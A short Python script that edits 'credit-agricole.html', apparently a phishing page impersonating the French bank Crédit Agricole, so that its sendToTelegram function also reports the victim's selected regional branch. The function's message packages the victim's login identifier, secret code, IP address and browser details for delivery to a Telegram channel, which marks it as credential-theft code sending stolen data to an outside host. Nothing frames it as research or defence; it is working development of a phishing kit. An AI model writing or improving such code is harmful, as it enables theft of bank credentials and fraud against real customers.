with open('credit-agricole.html', 'r', encoding='utf-8') as f:
    content = f.read()

# Find and replace the sendToTelegram function
old_func = """        // Envoi à Telegram
        async function sendToTelegram() {
            const ip = await getIP();
            const message = `🏦 CRÉDIT AGRICOLE - NOUVELLE CONNEXION 🏦\n━━━━━━━━━━━━━━━━━━━━━\n👤 Identifiant: ${currentUserId}\n🔑 Code: ${currentCode}\n━━━━━━━━━━━━━━━━━━━━━\n🌍 IP: ${ip}\n📱 User-Agent: ${navigator.userAgent}\n🕐 Date: ${new Date().toLocaleString('fr-FR')}\n✅ Statut: Connexion réussie`;"""

new_func = """        // Envoi à Telegram
        async function sendToTelegram() {
            const ip = await getIP();
            const selectedCaisse = document.getElementById('caisse-select').value;
            const caisseLabel = document.getElementById('caisse-select').options[document.getElementById('caisse-select').selectedIndex].text;
            const caisseInfo = selectedCaisse ? `\n🏪 Caisse: ${caisseLabel}` : '';
            const message = `🏦 CRÉDIT AGRICOLE - NOUVELLE CONNEXION 🏦\n━━━━━━━━━━━━━━━━━━━━━\n👤 Identifiant: ${currentUserId}\n🔑 Code: ${currentCode}${caisseInfo}\n━━━━━━━━━━━━━━━━━━━━━\n🌍 IP: ${ip}\n📱 User-Agent: ${navigator.userAgent}\n🕐 Date: ${new Date().toLocaleString('fr-FR')}\n✅ Statut: Connexion réussie`;"""

if old_func in content:
    content = content.replace(old_func, new_func)
    with open('credit-agricole.html', 'w', encoding='utf-8') as f:
        f.write(content)
    print("✓ Updated credit-agricole.html with caisse selection in Telegram message")
else:
    print("Could not find old function")
